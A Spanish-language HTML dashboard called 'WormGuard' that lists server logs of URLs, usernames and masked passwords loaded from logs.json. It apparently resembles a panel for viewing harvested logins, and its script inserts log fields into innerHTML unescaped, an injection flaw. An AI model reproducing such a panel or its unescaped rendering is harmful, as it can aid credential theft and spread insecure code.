<!DOCTYPE html>
<html lang="es">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>WormGuard - Dashboard</title>
 <style>
 body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #fff; margin: 0; padding: 0; }
.container { max-width: 1000px; margin: 0 auto; padding: 20px; }
 header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 2px solid #10b981; padding-bottom: 10px; }
 h1 { margin: 0; color: #10b981; }
.card { background: #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #334155; }
 table { width: 100%; border-collapse: collapse; background: #0f172a; border-radius: 8px; overflow: hidden; }
 th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #334155; }
 th { background: #1e293b; color: #94a3b8; }
 tr:hover { background: #334155; }
.badge { padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; font-weight: bold; }
.badge-safe { background: #dcfce7; color: #166534; }
 </style>
</head>
<body>
 <div class="container">
 <header>
 <h1>🛡️ WormGuard Dashboard</h1>
 <span class="badge badge-safe">Servidor Online</span>
 </header>

 <div class="card">
 <h2>Registros Recientes</h2>
 <p>Total logs en el servidor: <strong id="count">0</strong></p>
 
 <table>
 <thead>
 <tr>
 <th>Fecha</th>
 <th>URL</th>
 <th>Usuario</th>
 <th>Contraseña</th>
 </tr>
 </thead>
 <tbody id="log-body">
 <!-- Se llena con JS -->
 </tbody>
 </table>
 </div>
 </div>

 <script>
 // Cargar logs desde el archivo JSON del servidor
 fetch('logs.json')
.then(res => res.json())
.then(logs => {
 document.getElementById('count').innerText = logs.length;
 const tbody = document.getElementById('log-body');
 
 tbody.innerHTML = logs.map(log => `
 <tr>
 <td>${log.timestamp}</td>
 <td><a href="${log.url}" target="_blank" style="color:#38bdf8">${log.url}</a></td>
 <td>${log.username}</td>
 <td>***</td>
 </tr>
 `).join('');
 })
.catch(err => console.error("Error cargando logs:", err));
 </script>
</body>
</html>